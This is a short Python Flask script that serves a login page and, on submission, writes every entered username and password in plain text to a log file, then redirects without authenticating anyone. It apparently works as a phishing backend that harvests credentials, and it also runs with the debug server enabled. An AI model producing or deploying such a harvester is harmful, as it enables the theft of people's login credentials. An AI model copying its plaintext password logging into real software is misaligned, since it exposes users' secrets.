from flask import Flask, render_template, request, redirect

app = Flask(__name__)

LOG_FILE = "log.txt"

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        # Save the login details to the log file
        with open(LOG_FILE, "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")

        # Redirect after submission (optional)
        return redirect("/")
    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)
